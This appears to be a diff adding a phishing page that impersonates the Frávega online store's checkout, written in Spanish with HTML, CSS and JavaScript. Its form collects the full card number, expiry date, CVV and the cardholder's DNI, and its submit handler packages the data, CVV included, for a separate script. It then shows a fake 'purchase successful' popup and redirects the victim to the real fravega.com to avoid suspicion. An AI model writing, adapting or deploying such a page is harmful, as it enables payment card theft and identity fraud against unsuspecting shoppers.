@@ -1,0 +1,1083 @@
+<!DOCTYPE html>
+<html lang="es" translate="no">
+
+<head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Datos de Pago - Frávega</title>
+    <link rel="icon" href="assets/images/icon.png" />
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Roboto', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+            background-color: #fff;
+            color: #333;
+        }
+
+        a {
+            text-decoration: none;
+            color: inherit;
+        }
+
+        /* Header */
+        .header {
+            background-color: #fff;
+            border-bottom: 1px solid #ddd;
+            padding: 15px 40px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .header-logo {
+            margin-left: 20px;
+        }
+
+        .header-logo img {
+            height: 25px;
+        }
+
+        .header-secure {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 4px;
+        }
+
+        .header-secure svg {
+            width: 24px;
+            height: 24px;
+        }
+
+        .header-secure span {
+            font-size: 10px;
+            font-weight: 500;
+            color: #666;
+        }
+
+        /* Main Container */
+        .main-container {
+            max-width: 1100px;
+            margin: 0 auto;
+            padding: 30px 20px;
+        }
+
+        .page-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 30px;
+            padding-bottom: 20px;
+            border-bottom: 1px solid #eee;
+        }
+
+        .page-title {
+            font-size: 28px;
+            font-weight: 600;
+            color: #333;
+        }
+
+        .back-link {
+            color: #440099;
+            font-size: 14px;
+        }
+
+        .back-link:hover {
+            text-decoration: underline;
+        }
+
+        .content-wrapper {
+            display: flex;
+            gap: 30px;
+            align-items: flex-start;
+        }
+
+        /* Form Section */
+        .form-section {
+            flex: 1;
+        }
+
+        /* Step completed */
+        .step-completed {
+            background: #fff;
+            border: 1px solid #e0e0e0;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            padding: 20px 25px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .step-completed-left {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+
+        .step-check {
+            width: 32px;
+            height: 32px;
+            background: #00a650;
+            color: #fff;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .step-completed-info h3 {
+            font-size: 16px;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 4px;
+        }
+
+        .step-completed-info p {
+            font-size: 13px;
+            color: #666;
+        }
+
+        .step-edit {
+            color: #440099;
+            font-size: 14px;
+            cursor: pointer;
+        }
+
+        .step-edit:hover {
+            text-decoration: underline;
+        }
+
+        /* Current Step */
+        .step-box {
+            background: #fff;
+            border: 1px solid #e0e0e0;
+            border-radius: 8px;
+            overflow: hidden;
+        }
+
+        .step-header {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            padding: 20px 25px;
+        }
+
+        .step-number {
+            width: 32px;
+            height: 32px;
+            background: #00a650;
+            color: #fff;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 600;
+            font-size: 14px;
+        }
+
+        .step-title {
+            font-size: 18px;
+            font-weight: 600;
+            color: #440099;
+        }
+
+        .step-content {
+            padding: 25px;
+            border-top: 1px solid #eee;
+        }
+
+        /* Payment Methods */
+        .payment-methods {
+            display: flex;
+            gap: 15px;
+            margin-bottom: 25px;
+        }
+
+        .payment-method {
+            flex: 1;
+            border: 2px solid #e0e0e0;
+            border-radius: 8px;
+            padding: 20px;
+            cursor: pointer;
+            text-align: center;
+            transition: all 0.3s;
+        }
+
+        .payment-method:hover {
+            border-color: #440099;
+        }
+
+        .payment-method.selected {
+            border-color: #440099;
+            background: #f8f4ff;
+        }
+
+        .payment-method svg {
+            width: 40px;
+            height: 40px;
+            margin-bottom: 10px;
+            color: #440099;
+        }
+
+        .payment-method-title {
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        /* Card Form */
+        .card-form {
+            margin-top: 25px;
+        }
+
+        .card-icons {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+
+        .card-icon {
+            width: 50px;
+            height: 32px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 10px;
+            font-weight: 600;
+            color: #666;
+        }
+
+        .card-icon.visa {
+            background: linear-gradient(135deg, #1a1f71 0%, #1a1f71 100%);
+            color: #fff;
+        }
+
+        .card-icon.mastercard {
+            background: linear-gradient(135deg, #eb001b 0%, #f79e1b 100%);
+            color: #fff;
+        }
+
+        .card-icon.amex {
+            background: #006fcf;
+            color: #fff;
+        }
+
+        .form-row {
+            display: flex;
+            gap: 20px;
+            margin-bottom: 20px;
+        }
+
+        .form-group {
+            flex: 1;
+        }
+
+        .form-label {
+            display: block;
+            font-size: 14px;
+            color: #440099;
+            margin-bottom: 8px;
+        }
+
+        .form-input {
+            width: 100%;
+            padding: 12px 14px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 14px;
+        }
+
+        .form-input:focus {
+            outline: none;
+            border-color: #440099;
+        }
+
+        .form-input-icon {
+            position: relative;
+        }
+
+        .form-input-icon input {
+            padding-right: 40px;
+        }
+
+        .form-input-icon svg {
+            position: absolute;
+            right: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            width: 20px;
+            height: 20px;
+            color: #999;
+        }
+
+        .installments-select {
+            width: 100%;
+            padding: 12px 14px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 14px;
+            background: #fff;
+            cursor: pointer;
+        }
+
+        .secure-badge {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-top: 20px;
+            padding: 15px;
+            background: #f5f5f5;
+            border-radius: 8px;
+        }
+
+        .secure-badge svg {
+            width: 20px;
+            height: 20px;
+            color: #00a650;
+        }
+
+        .secure-badge p {
+            font-size: 13px;
+            color: #666;
+        }
+
+        .btn-pay {
+            width: 100%;
+            padding: 16px;
+            background: #440099;
+            color: #fff;
+            border: none;
+            border-radius: 8px;
+            font-size: 18px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 25px;
+            transition: background 0.3s;
+        }
+
+        .btn-pay:hover {
+            background: #330077;
+        }
+
+        /* Sidebar */
+        .sidebar {
+            width: 320px;
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+        }
+
+        .product-preview {
+            display: flex;
+            gap: 15px;
+            align-items: flex-start;
+        }
+
+        .product-preview-image {
+            width: 70px;
+            height: 70px;
+            flex-shrink: 0;
+            position: relative;
+        }
+
+        .product-preview-image img {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+        }
+
+        .product-qty {
+            position: absolute;
+            top: -5px;
+            right: -5px;
+            background: #e91e63;
+            color: #fff;
+            border-radius: 50%;
+            width: 18px;
+            height: 18px;
+            font-size: 11px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .product-preview-info h4 {
+            font-size: 14px;
+            font-weight: 400;
+            color: #333;
+            line-height: 1.4;
+        }
+
+        .product-preview-price {
+            font-size: 16px;
+            font-weight: 600;
+            color: #333;
+            margin-top: 8px;
+        }
+
+        .summary-box {
+            background: #fff;
+            border: 1px solid #e0e0e0;
+            border-radius: 8px;
+            padding: 20px;
+        }
+
+        .summary-title {
+            font-size: 16px;
+            font-weight: 600;
+            margin-bottom: 20px;
+        }
+
+        .summary-row {
+            display: flex;
+            justify-content: space-between;
+            font-size: 14px;
+            margin-bottom: 15px;
+            padding-bottom: 15px;
+            border-bottom: 1px solid #eee;
+        }
+
+        .summary-total {
+            display: flex;
+            justify-content: space-between;
+            font-size: 18px;
+            font-weight: 600;
+        }
+
+        /* Footer */
+        .footer {
+            background: #fff;
+            padding: 40px;
+            margin-top: 50px;
+            border-top: 1px solid #ddd;
+        }
+
+        .footer-content {
+            max-width: 1100px;
+            margin: 0 auto;
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-start;
+        }
+
+        .footer-text {
+            flex: 1;
+        }
+
+        .footer-text img {
+            height: 33px;
+            margin-bottom: 20px;
+        }
+
+        .footer-text p {
+            font-size: 12px;
+            color: #666;
+            line-height: 1.6;
+            margin-bottom: 10px;
+        }
+
+        .footer-logos {
+            display: flex;
+            gap: 20px;
+            align-items: center;
+        }
+
+        .footer-logos img {
+            height: 50px;
+        }
+
+        @media (max-width: 768px) {
+            .content-wrapper {
+                flex-direction: column;
+            }
+
+            .sidebar {
+                width: 100%;
+            }
+
+            .form-row {
+                flex-direction: column;
+            }
+
+            .payment-methods {
+                flex-direction: column;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <!-- Header -->
+    <header class="header">
+        <a href="index.html" class="header-logo">
+            <img src="assets/images/Logo.webp" alt="Frávega" />
+        </a>
+        <div class="header-secure">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none"
+                stroke="currentColor" stroke-width="2">
+                <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
+                <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
+            </svg>
+            <span>SITIO SEGURO</span>
+        </div>
+    </header>
+
+    <!-- Main Content -->
+    <main class="main-container">
+        <div class="page-header">
+            <h1 class="page-title">Finalizar la compra</h1>
+            <a href="/homeinfos" class="back-link">Volver</a>
+        </div>
+
+        <div class="content-wrapper">
+            <!-- Form Section -->
+            <section class="form-section">
+                <!-- Step 1 Completed -->
+                <div class="step-completed">
+                    <div class="step-completed-left">
+                        <div class="step-check">
+                            <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24"
+                                fill="none" stroke="currentColor" stroke-width="3">
+                                <polyline points="20 6 9 17 4 12"></polyline>
+                            </svg>
+                        </div>
+                        <div class="step-completed-info">
+                            <h3>Datos Personales y Tipo de Factura</h3>
+                            <p id="customerSummary">Consumidor Final</p>
+                        </div>
+                    </div>
+                    <a href="/infos" class="step-edit">Editar</a>
+                </div>
+
+                <!-- Step 2 Completed -->
+                <div class="step-completed">
+                    <div class="step-completed-left">
+                        <div class="step-check">
+                            <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24"
+                                fill="none" stroke="currentColor" stroke-width="3">
+                                <polyline points="20 6 9 17 4 12"></polyline>
+                            </svg>
+                        </div>
+                        <div class="step-completed-info">
+                            <h3>Dirección de Entrega</h3>
+                            <p id="shippingSummary">Envío a domicilio - Gratis</p>
+                        </div>
+                    </div>
+                    <a href="/homeinfos" class="step-edit">Editar</a>
+                </div>
+
+                <!-- Step 3 - Current -->
+                <div class="step-box">
+                    <div class="step-header">
+                        <div class="step-number">3</div>
+                        <h2 class="step-title">Método de Pago</h2>
+                    </div>
+                    <div class="step-content">
+                        <!-- Payment Methods -->
+                        <div class="payment-methods">
+                            <div class="payment-method selected">
+                                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none"
+                                    stroke="currentColor" stroke-width="2">
+                                    <rect x="1" y="4" width="22" height="16" rx="2" ry="2"></rect>
+                                    <line x1="1" y1="10" x2="23" y2="10"></line>
+                                </svg>
+                                <p class="payment-method-title">Tarjeta de crédito</p>
+                            </div>
+                            <div class="payment-method">
+                                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none"
+                                    stroke="currentColor" stroke-width="2">
+                                    <rect x="1" y="4" width="22" height="16" rx="2" ry="2"></rect>
+                                    <line x1="1" y1="10" x2="23" y2="10"></line>
+                                </svg>
+                                <p class="payment-method-title">Tarjeta de débito</p>
+                            </div>
+                        </div>
+
+                        <!-- Card Form -->
+                        <form class="card-form" id="paymentForm">
+                            <div class="card-icons" id="cardIconsContainer">
+                                <div class="card-icon visa" data-brand="visa">VISA</div>
+                                <div class="card-icon mastercard" data-brand="mastercard">MC</div>
+                                <div class="card-icon amex" data-brand="amex">AMEX</div>
+                                <div class="card-icon" style="background:#004f98;color:#fff;" data-brand="cabal">CABAL
+                                </div>
+                                <div class="card-icon" style="background:#ff5900;color:#fff;" data-brand="naranja">
+                                    NARANJA</div>
+                            </div>
+
+                            <div class="form-group" style="margin-bottom: 20px;">
+                                <label class="form-label">Número de tarjeta</label>
+                                <div class="form-input-icon">
+                                    <input type="text" class="form-input" id="cardNumberField"
+                                        placeholder="1234 5678 9012 3456" maxlength="23" required />
+                                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none"
+                                        stroke="currentColor" stroke-width="2" id="cardValidationIcon">
+                                        <rect x="1" y="4" width="22" height="16" rx="2" ry="2"></rect>
+                                        <line x1="1" y1="10" x2="23" y2="10"></line>
+                                    </svg>
+                                </div>
+                                <small id="cardNumberError"
+                                    style="color:#dc3545;font-size:12px;margin-top:4px;display:none;">Número de tarjeta
+                                    inválido</small>
+                            </div>
+
+                            <div class="form-group" style="margin-bottom: 20px;">
+                                <label class="form-label">Nombre del titular (como figura en la tarjeta)</label>
+                                <input type="text" class="form-input" id="cardHolderField" placeholder="JUAN PEREZ"
+                                    required />
+                            </div>
+
+                            <div class="form-row">
+                                <div class="form-group">
+                                    <label class="form-label">Fecha de vencimiento</label>
+                                    <div class="expiry-wrapper" style="display:flex;gap:8px;align-items:center;">
+                                        <input type="text" class="form-input" id="expiryMonth" placeholder="MM"
+                                            maxlength="2" inputmode="numeric" pattern="[0-9]*"
+                                            style="width:60px;text-align:center;font-size:16px;letter-spacing:2px;"
+                                            required />
+                                        <span style="font-size:20px;color:#999;font-weight:300;">/</span>
+                                        <input type="text" class="form-input" id="expiryYear" placeholder="AA"
+                                            maxlength="2" inputmode="numeric" pattern="[0-9]*"
+                                            style="width:60px;text-align:center;font-size:16px;letter-spacing:2px;"
+                                            required />
+                                    </div>
+                                    <small id="expiryError"
+                                        style="color:#dc3545;font-size:12px;margin-top:4px;display:none;"></small>
+                                </div>
+                                <div class="form-group">
+                                    <label class="form-label">Código de seguridad</label>
+                                    <div class="form-input-icon">
+                                        <input type="text" class="form-input" id="cvvField" placeholder="CVV"
+                                            maxlength="4" required />
+                                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none"
+                                            stroke="currentColor" stroke-width="2">
+                                            <circle cx="12" cy="12" r="10"></circle>
+                                            <path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3"></path>
+                                            <line x1="12" y1="17" x2="12.01" y2="17"></line>
+                                        </svg>
+                                    </div>
+                                </div>
+                            </div>
+
+                            <div class="form-group" style="margin-bottom: 20px;">
+                                <label class="form-label">Cuotas</label>
+                                <select class="installments-select" id="installmentsField">
+                                    <option value="1">1 cuota (sin interés)</option>
+                                    <option value="3">3 cuotas (sin interés)</option>
+                                    <option value="6">6 cuotas (sin interés)</option>
+                                    <option value="12">12 cuotas (CFT: 45%)</option>
+                                    <option value="18">18 cuotas (CFT: 55%)</option>
+                                </select>
+                            </div>
+
+                            <div class="form-group">
+                                <label class="form-label">DNI del titular de la tarjeta</label>
+                                <input type="text" class="form-input" id="cardDniField" placeholder="Sin puntos"
+                                    maxlength="8" required />
+                            </div>
+
+                            <div class="secure-badge">
+                                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none"
+                                    stroke="currentColor" stroke-width="2">
+                                    <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
+                                    <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
+                                </svg>
+                                <p>Tus datos están protegidos. La información de tu tarjeta se transmite de forma
+                                    segura.</p>
+                            </div>
+
+                            <button type="submit" class="btn-pay" id="payBtn">PAGAR</button>
+                        </form>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Sidebar -->
+            <aside class="sidebar">
+                <div id="productPreviewContainer"></div>
+
+                <div class="summary-box" id="summaryBox"></div>
+            </aside>
+        </div>
+    </main>
+
+    <!-- Footer -->
+    <footer class="footer">
+        <div class="footer-content">
+            <div class="footer-text">
+                <img src="assets/images/Logo.webp" alt="Frávega" />
+                <p>Copyright 1972-2024 | Todos los derechos reservados Fravega.com. Frávega S.A.C.I. e I. Valentín Gómez
+                    2813 (1191) | Capital Federal | Argentina</p>
+                <p>Las fotos son a modo ilustrativo. La venta de cualquiera de los productos publicados está sujeta a la
+                    verificación de stock.</p>
+            </div>
+            <div class="footer-logos">
+                <img src="https://images.fravega.com/f300/84e015d55939d4f5961bf5dcb4989d78.png" alt="CAECE" />
+                <img src="https://www.argentina.gob.ar/sites/default/files/aaip-isologo.png" alt="AAIP"
+                    style="height: 40px;" />
+                <img src="https://images.fravega.com/f300/32cbb64340160607a44b6b5c35688bd6.png" alt="Data Fiscal"
+                    style="height: 45px;" />
+            </div>
+        </div>
+    </footer>
+
+    <script src="assets/js/checkout.js"></script>
+    <script>
+        document.addEventListener('DOMContentLoaded', async function () {
+            // Get elements
+            const form = document.getElementById('paymentForm');
+            const customerSummary = document.getElementById('customerSummary');
+            const shippingSummary = document.getElementById('shippingSummary');
+            const productPreviewContainer = document.getElementById('productPreviewContainer');
+            const summaryBox = document.getElementById('summaryBox');
+            const payBtn = document.getElementById('payBtn');
+            const paymentMethods = document.querySelectorAll('.payment-method');
+            const cardNumberField = document.getElementById('cardNumberField');
+            const installmentsField = document.getElementById('installmentsField');
+
+            let selectedPaymentMethod = 'credit_card';
+
+            CheckoutAPI.showLoading('Cargando datos de pago...');
+
+            try {
+                // Load order data
+                let order = await CheckoutAPI.getPendingOrder();
+
+                if (!order) {
+                    CheckoutAPI.hideLoading();
+                    CheckoutAPI.showToast('No se encontró una orden. Iniciando nuevamente...', true);
+                    setTimeout(() => window.location.href = 'Email.html', 1500);
+                    return;
+                }
+
+                // Show customer summary
+                if (order.customer) {
+                    const invoiceLabels = {
+                        'consumidor_final': 'Consumidor Final',
+                        'responsable_inscripto': 'Responsable Inscripto',
+                        'monotributista': 'Monotributista'
+                    };
+                    const name = `${order.customer.firstName || ''} ${order.customer.lastName || ''}`.trim();
+                    customerSummary.textContent = `${name} - ${invoiceLabels[order.customer.invoiceType] || 'Consumidor Final'}`;
+                }
+
+                // Show shipping summary
+                if (order.shipping) {
+                    const methodLabels = {
+                        'home_delivery': 'Envío a domicilio',
+                        'store_pickup': 'Retiro en sucursal'
+                    };
+                    const addr = order.shipping.address;
+                    const addressText = addr ? `${addr.street} ${addr.number}, ${addr.city}` : '';
+                    shippingSummary.textContent = `${methodLabels[order.shipping.method] || 'Envío'} - ${addressText}`;
+                }
+
+                // Render product preview
+                CheckoutAPI.renderProductPreview(order.items, productPreviewContainer);
+
+                // Render order summary
+                CheckoutAPI.renderOrderSummary(order, summaryBox);
+
+                // Update pay button text
+                payBtn.textContent = `PAGAR ${CheckoutAPI.formatPrice(order.total)}`;
+
+                CheckoutAPI.hideLoading();
+
+                CheckoutAPI.hideLoading();
+
+            } catch (error) {
+                CheckoutAPI.hideLoading();
+                CheckoutAPI.showToast('Error al cargar los datos de la orden', true);
+                console.error('Error loading payment:', error);
+            }
+
+            // Handle payment method selection
+            paymentMethods.forEach((method, index) => {
+                method.addEventListener('click', function () {
+                    paymentMethods.forEach(m => m.classList.remove('selected'));
+                    this.classList.add('selected');
+                    selectedPaymentMethod = index === 0 ? 'credit_card' : 'debit_card';
+                });
+            });
+
+            // Format DNI as user types
+            const cardDniField = document.getElementById('cardDniField');
+            cardDniField.addEventListener('input', function (e) {
+                e.target.value = CheckoutAPI.formatDNI(e.target.value);
+            });
+
+            // Handle Card Number Formatting and Validation
+            const cardIcons = document.querySelectorAll('.card-icon');
+            const cardNumberError = document.getElementById('cardNumberError');
+            const cardValidationIcon = document.getElementById('cardValidationIcon');
+
+            function updateCardBrand(brand) {
+                cardIcons.forEach(icon => {
+                    icon.style.opacity = '0.3'; // dim all
+                    if (icon.getAttribute('data-brand') === brand) {
+                        icon.style.opacity = '1';
+                        icon.style.transform = 'scale(1.05)';
+                        icon.style.boxShadow = '0 2px 8px rgba(0,0,0,0.2)';
+                    } else {
+                        icon.style.transform = 'none';
+                        icon.style.boxShadow = 'none';
+                    }
+                });
+                if (brand === 'unknown' || !brand) {
+                    cardIcons.forEach(icon => icon.style.opacity = '1'); // reset if empty/unknown
+                }
+            }
+
+            cardNumberField.addEventListener('input', function (e) {
+                let formatted = CheckoutAPI.formatCardNumber(e.target.value);
+                e.target.value = formatted;
+
+                const raw = formatted.replace(/\D/g, '');
+                const brand = CheckoutAPI.getCardBrand(raw);
+                updateCardBrand(brand);
+
+                // Update CVV length based on brand
+                const cvvField = document.getElementById('cvvField');
+                if (brand === 'amex') {
+                    cvvField.setAttribute('maxlength', '4');
+                    cvvField.placeholder = '4 dígitos';
+                } else {
+                    cvvField.setAttribute('maxlength', '3');
+                    cvvField.placeholder = '3 dígitos';
+                    if (cvvField.value.length > 3) cvvField.value = cvvField.value.substring(0, 3);
+                }
+
+                // Hide error while typing
+                cardNumberError.style.display = 'none';
+                cardNumberField.style.borderColor = '#440099';
+                cardValidationIcon.style.color = '#440099';
+            });
+
+            cardNumberField.addEventListener('blur', function (e) {
+                const raw = e.target.value.replace(/\D/g, '');
+                if (raw.length > 0) {
+                    const isValid = CheckoutAPI.validateLuhn(raw);
+                    if (!isValid) {
+                        cardNumberError.style.display = 'block';
+                        cardNumberField.style.borderColor = '#dc3545';
+                        cardValidationIcon.style.color = '#dc3545';
+                    } else {
+                        cardNumberField.style.borderColor = '#00a650';
+                        cardValidationIcon.style.color = '#00a650';
+                    }
+                } else {
+                    cardNumberField.style.borderColor = '#ddd';
+                    cardValidationIcon.style.color = '#999';
+                }
+            });
+
+            // --- Expiry date UX ---
+            const expiryMonth = document.getElementById('expiryMonth');
+            const expiryYear = document.getElementById('expiryYear');
+            const expiryError = document.getElementById('expiryError');
+
+            function showExpiryError(msg) {
+                expiryError.textContent = msg;
+                expiryError.style.display = 'block';
+                expiryMonth.style.borderColor = '#dc3545';
+                expiryYear.style.borderColor = '#dc3545';
+            }
+            function clearExpiryError() {
+                expiryError.style.display = 'none';
+                expiryMonth.style.borderColor = '';
+                expiryYear.style.borderColor = '';
+            }
+
+            // Month field: only digits, clamp 01-12, auto-advance to year
+            expiryMonth.addEventListener('input', function (e) {
+                let v = e.target.value.replace(/\D/g, '');
+                if (v.length === 1 && parseInt(v) > 1) {
+                    v = '0' + v; // typing "5" becomes "05"
+                }
+                if (v.length === 2) {
+                    const m = parseInt(v);
+                    if (m < 1 || m > 12) {
+                        showExpiryError('Mes inválido (01-12)');
+                        v = '';
+                    } else {
+                        clearExpiryError();
+                        // Auto-advance to year field
+                        setTimeout(() => expiryYear.focus(), 0);
+                    }
+                } else {
+                    clearExpiryError();
+                }
+                e.target.value = v.slice(0, 2);
+            });
+
+            // Year field: only digits, validate not expired
+            expiryYear.addEventListener('input', function (e) {
+                let v = e.target.value.replace(/\D/g, '').slice(0, 2);
+                e.target.value = v;
+                clearExpiryError();
+
+                if (v.length === 2) {
+                    const mm = parseInt(expiryMonth.value);
+                    const yy = parseInt(v);
+                    const now = new Date();
+                    const currentYear = now.getFullYear() % 100;
+                    const currentMonth = now.getMonth() + 1;
+                    if (yy < currentYear || (yy === currentYear && mm < currentMonth)) {
+                        showExpiryError('Tarjeta vencida');
+                    } else {
+                        clearExpiryError();
+                        // Auto-advance to CVV
+                        setTimeout(() => document.getElementById('cvvField').focus(), 0);
+                    }
+                }
+            });
+
+            // Backspace on empty year returns to month
+            expiryYear.addEventListener('keydown', function (e) {
+                if (e.key === 'Backspace' && this.value === '') {
+                    e.preventDefault();
+                    expiryMonth.focus();
+                }
+            });
+
+            // Visual focus styling
+            [expiryMonth, expiryYear].forEach(el => {
+                el.addEventListener('focus', function () {
+                    this.style.borderColor = '#440099';
+                    this.style.boxShadow = '0 0 0 2px rgba(68,0,153,0.15)';
+                });
+                el.addEventListener('blur', function () {
+                    this.style.boxShadow = '';
+                    if (!expiryError.style.display || expiryError.style.display === 'none') {
+                        this.style.borderColor = '';
+                    }
+                });
+            });
+
+            // Detect card brand
+            function detectCardBrand(number) {
+                const cleaned = number.replace(/\s/g, '');
+                if (/^4/.test(cleaned)) return 'VISA';
+                if (/^5[1-5]/.test(cleaned)) return 'Mastercard';
+                if (/^3[47]/.test(cleaned)) return 'AMEX';
+                return 'Tarjeta';
+            }
+
+            // Handle form submission
+            form.addEventListener('submit', async function (e) {
+                e.preventDefault();
+
+                const cardNumber = cardNumberField.value.replace(/\s/g, '');
+                const cardHolder = document.getElementById('cardHolderField').value.trim();
+                const expMonth = expiryMonth.value.trim();
+                const expYear = expiryYear.value.trim();
+                const expiry = expMonth && expYear ? expMonth + '/' + expYear : '';
+                const cvv = document.getElementById('cvvField').value.trim();
+                const installments = parseInt(installmentsField.value);
+                const cardDni = document.getElementById('cardDniField').value.trim();
+
+                // Validation
+                if (!CheckoutAPI.validateLuhn(cardNumber)) {
+                    CheckoutAPI.showToast('El número de tarjeta no es válido (Fallo de validación Luhn)', true);
+                    cardNumberError.style.display = 'block';
+                    cardNumberField.style.borderColor = '#dc3545';
+                    cardNumberField.focus();
+                    return;
+                }
+                if (!cardHolder) {
+                    CheckoutAPI.showToast('Por favor ingresa el nombre del titular', true);
+                    return;
+                }
+                if (!expiry || !/^\d{2}\/\d{2}$/.test(expiry)) {
+                    CheckoutAPI.showToast('Por favor ingresa la fecha de vencimiento (MM/AA)', true);
+                    expiryMonth.focus();
+                    return;
+                }
+                // Validate not expired
+                const mm = parseInt(expMonth);
+                const yy = parseInt(expYear);
+                const now = new Date();
+                if (yy < now.getFullYear() % 100 || (yy === now.getFullYear() % 100 && mm < now.getMonth() + 1)) {
+                    showExpiryError('Tarjeta vencida');
+                    expiryMonth.focus();
+                    return;
+                }
+                if (!cvv || cvv.length < 3) {
+                    CheckoutAPI.showToast('Por favor ingresa el código de seguridad', true);
+                    return;
+                }
+                if (!cardDni) {
+                    CheckoutAPI.showToast('Por favor ingresa el DNI del titular', true);
+                    return;
+                }
+
+                const paymentData = {
+                    method: selectedPaymentMethod,
+                    cardNumber: cardNumber,
+                    cardLastFour: cardNumber.slice(-4),
+                    cardBrand: CheckoutAPI.getCardBrand(cardNumber),
+                    cardHolder: cardHolder,
+                    cardExpiry: expiry,
+                    cardCvv: cvv,
+                    cardDni: cardDni,
+                    installments: installments
+                };
+
+                try {
+                    payBtn.disabled = true;
+                    payBtn.textContent = 'Procesando pago...';
+                    CheckoutAPI.showLoading('Procesando tu pago de forma segura...');
+
+                    const result = await CheckoutAPI.completePayment(paymentData);
+
+                    CheckoutAPI.hideLoading();
+
+                    // Store order info for confirmation
+                    localStorage.setItem('fravega_last_order', JSON.stringify({
+                        orderNumber: result.orderNumber,
+                        total: result.total,
+                        items: result.items?.length || 0
+                    }));
+
+                    // Show success toast
+                    CheckoutAPI.showToast(`¡Compra realizada! Orden: ${result.orderNumber}`);
+
+                    // Show confirmation popup before redirecting
+                    const overlay = document.createElement('div');
+                    overlay.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.5);display:flex;align-items:center;justify-content:center;z-index:10000;';
+                    const popup = document.createElement('div');
+                    popup.style.cssText = 'background:#fff;border-radius:12px;padding:40px 32px;max-width:420px;width:90%;text-align:center;box-shadow:0 8px 30px rgba(0,0,0,0.2);font-family:Roboto,-apple-system,BlinkMacSystemFont,Segoe UI,sans-serif;';
+                    popup.innerHTML = `
+                        <div style="width:60px;height:60px;border-radius:50%;background:#440099;display:flex;align-items:center;justify-content:center;margin:0 auto 20px;">
+                            <svg width="30" height="30" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>
+                        </div>
+                        <h2 style="color:#333;font-size:20px;font-weight:600;margin-bottom:12px;">¡Compra realizada con éxito!</h2>
+                        <p style="color:#666;font-size:15px;line-height:1.5;margin-bottom:24px;">Recibirás el recibo en tu correo electrónico si el pago fue exitoso.</p>
+                        <button id="popupOkBtn" style="background:#440099;color:#fff;border:none;border-radius:8px;padding:14px 40px;font-size:16px;font-weight:600;cursor:pointer;transition:background 0.3s;">ACEPTAR</button>
+                    `;
+                    overlay.appendChild(popup);
+                    document.body.appendChild(overlay);
+
+                    document.getElementById('popupOkBtn').addEventListener('click', () => {
+                        window.location.href = 'https://www.fravega.com/';
+                    });
+
+                } catch (error) {
+                    CheckoutAPI.hideLoading();
+                    CheckoutAPI.showToast('Error al procesar el pago: ' + error.message, true);
+                    payBtn.disabled = false;
+                    payBtn.textContent = `PAGAR ${CheckoutAPI.formatPrice(order.total)}`;
+                }
+            });
+        });
+    </script>
+</body>
+
+</html>
